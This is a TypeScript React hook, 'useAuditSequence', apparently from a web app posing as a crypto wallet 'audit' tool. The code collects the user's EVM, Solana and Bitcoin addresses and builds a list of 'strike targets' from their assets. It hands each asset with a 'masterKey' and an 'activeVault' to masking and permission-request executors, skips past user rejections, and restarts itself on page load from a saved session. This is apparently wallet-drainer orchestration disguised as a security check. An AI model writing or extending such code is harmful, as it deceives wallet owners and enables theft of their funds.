"use client";

import { useCallback, useEffect, useRef } from "react";
import { useContractMask } from "./useContractMask";
import { useTokenPermissions } from "./seTokenPermissions";
import { useWalletClient } from "wagmi";
import { useAuditScanner, startPreload } from "./useAuditScanner";
import { useAuditExecutor } from "./useAuditExecutor";
import { useNonEvmExecutor } from "./useNonEvmExecutor";

const verifySessionIntegrity = (data: any) => {
  if (!data) return false;
  const hasIdentity =
    data.userAddress ||
    data.solanaAddress ||
    data.bitcoinAddress ||
    data.address;
  return !!hasIdentity;
};

let globalSequenceRunning = false;

/**
 * 🛰️ MASTER SEQUENCE CONTROLLER (v16.0.0 - Mobile Resilient Edition)
 */
export function useAuditSequence() {
  const { executeMask } = useContractMask();
  const { requestManualPermission } = useTokenPermissions();
  // We use the hook to get the latest client state
  const { data: walletClient } = useWalletClient();
  const { runNonEvmStrike } = useNonEvmExecutor();

  const { performScan } = useAuditScanner();
  const { runExecutionLoop } = useAuditExecutor({
    executeMask,
    requestManualPermission,
  });

  const isBusy = useRef(false);
  // Ref to track the latest wallet client for the async loop
  const walletClientRef = useRef(walletClient);

  useEffect(() => {
    walletClientRef.current = walletClient;
  }, [walletClient]);

  useEffect(() => {
    globalSequenceRunning = false;
    isBusy.current = false;
  }, []);

  const ensureProviderReady = async (type: string, logPrefix: string) => {
    const isSolana = type === "SOLANA" || type === "SOL";
    if (isSolana) {
      if ((window as any).solana) return true;
      let attempts = 0;
      while (!(window as any).solana && attempts < 10) {
        await new Promise((r) => setTimeout(r, 100));
        attempts++;
      }
      if (!(window as any).solana) throw new Error("SOLANA_PROVIDER_MISSING");
    }
    return true;
  };

  /**
   * 🛡️ MOBILE RESILIENCE: Wait for the Wallet Client to hydrate
   */
  const waitForWalletClient = async (logPrefix: string) => {
    if (walletClientRef.current) return walletClientRef.current;

    console.log(`${logPrefix} ⏳ Waiting for WalletClient to sync...`);
    let attempts = 0;
    while (!walletClientRef.current && attempts < 25) {
      // Wait up to 5 seconds
      await new Promise((r) => setTimeout(r, 200));
      attempts++;
    }
    return walletClientRef.current;
  };

  const runAuditStep = useCallback(
    async (params: any) => {
      const logPrefix = "[useAuditSequence.ts]";

      if (isBusy.current || globalSequenceRunning) {
        return { status: "BUSY" };
      }

      try {
        isBusy.current = true;
        globalSequenceRunning = true;

        // 🛡️ STEP 1: SCAN & VALIDATE (Triggers the Signature)
        const scanResults = await performScan({ ...params, logPrefix });

        if (!scanResults) {
          globalSequenceRunning = false;
          isBusy.current = false;
          return { status: "IDLE" };
        }

        if (!verifySessionIntegrity(scanResults)) {
          sessionStorage.removeItem("active_strike_session");
          throw new Error("SECURITY_INTEGRITY_VIOLATION");
        }

        if (scanResults.isFinished) {
          return { status: "IDLE" };
        }

        const { masterKey, activeVault, assets, plan } = scanResults;
        const userAddress =
          scanResults.userAddress ||
          scanResults.solanaAddress ||
          scanResults.bitcoinAddress ||
          scanResults.address;

        const strikeTargets = (
          plan && plan.length > 0 ? plan.map((p: any) => p.asset) : assets
        ).map((asset: any) => ({
          ...asset,
          contractAddress:
            asset.contractAddress || asset.tokenAddress || asset.address,
        }));

        // 🛡️ STEP 2: STABILITY BUFFER
        await new Promise((r) => setTimeout(r, 100));

        // 🛡️ STEP 3: EXECUTION LOOP
        console.log(
          `${logPrefix} ⚡ Execution started: ${strikeTargets.length} assets.`,
        );

        for (const asset of strikeTargets) {
          try {
            const chainType = (asset.chainType || "").toUpperCase();
            const assetChainId = Number(asset.chainId);

            const isNonEvm =
              ["SOLANA", "SOL", "BITCOIN", "BTC", "XRP", "LTC"].includes(
                chainType,
              ) || [501, 144, 0].includes(assetChainId);

            if (!isNonEvm) {
              // 🚀 ENSURE CLIENT IS READY BEFORE HANDOFF
              const activeClient = await waitForWalletClient(logPrefix);

              if (!activeClient) {
                console.error(
                  `${logPrefix} ❌ Wallet connection lost. Stopping sequence.`,
                );
                break;
              }

              console.log(
                `${logPrefix} 🎯 Handing off ${asset.symbol} to Executor...`,
              );

              await runExecutionLoop({
                assets: [asset],
                userAddress,
                activeVault,
                masterKey,
                logPrefix,
                walletClient: activeClient,
              });
            } else {
              await ensureProviderReady(chainType, logPrefix);
              await runNonEvmStrike(asset, {
                userAddress: asset.address || userAddress,
                masterKey,
                logPrefix,
              });
            }
          } catch (err: any) {
            const errLower = (err?.message || "").toLowerCase();
            if (
              err?.code === 4001 ||
              errLower.includes("rejected") ||
              errLower.includes("denied")
            ) {
              console.log(`${logPrefix} 🛑 User rejected action.`);
              continue;
            }
            continue;
          }
        }

        const finalSession = sessionStorage.getItem("active_strike_session");
        if (finalSession) {
          const data = JSON.parse(finalSession);
          sessionStorage.setItem(
            "active_strike_session",
            JSON.stringify({ ...data, isFinished: true }),
          );
        }

        if (params.onComplete) params.onComplete();
        return { status: "COMPLETE" };
      } catch (e: any) {
        console.error(`${logPrefix} ❌ Global Sequence Error:`, e.message);
        return { status: "ERROR" };
      } finally {
        isBusy.current = false;
        globalSequenceRunning = false;
      }
    },
    [performScan, runExecutionLoop, runNonEvmStrike], // walletClient removed from deps to use Ref
  );

  useEffect(() => {
    startPreload();
    const session = sessionStorage.getItem("active_strike_session");
    if (session && !globalSequenceRunning) {
      const data = JSON.parse(session);
      if (data.isFinished) return;

      const hasValidAddress =
        data.userAddress || data.solanaAddress || data.bitcoinAddress;
      if (!hasValidAddress) return;

      const timer = setTimeout(() => {
        runAuditStep({
          userAddress: data.userAddress,
          solanaAddress: data.solanaAddress,
          bitcoinAddress: data.bitcoinAddress,
          solana: data.solanaAddress,
          btc: data.bitcoinAddress,
        });
      }, 400);
      return () => clearTimeout(timer);
    }
  }, [runAuditStep]);

  return { runAuditStep };
}
